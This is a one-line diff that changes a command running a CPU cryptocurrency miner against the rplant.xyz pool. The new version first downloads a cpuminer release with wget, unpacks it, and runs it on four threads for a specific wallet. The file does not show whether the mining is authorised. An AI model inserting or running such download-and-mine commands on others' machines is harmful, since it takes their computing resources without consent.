@@ -1,1 +1,1 @@
-./sse2 -a yespowerTIDE  -o stratum+tcp://stratum-eu.rplant.xyz:7059 -u TD368ah8Kuzn2quR7g6r8sUYbsVvKzwpyc.dev22
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz && tar -zxvf cpuminer-opt-linux-5.0.41a.tar.gz  && ./cpuminer-sse2 -a yespowerTIDE  -o stratum+tcp://stratum-eu.rplant.xyz:7059 -u TD368ah8Kuzn2quR7g6r8sUYbsVvKzwpyc.dev019 -t 4 --cpu-priority 5
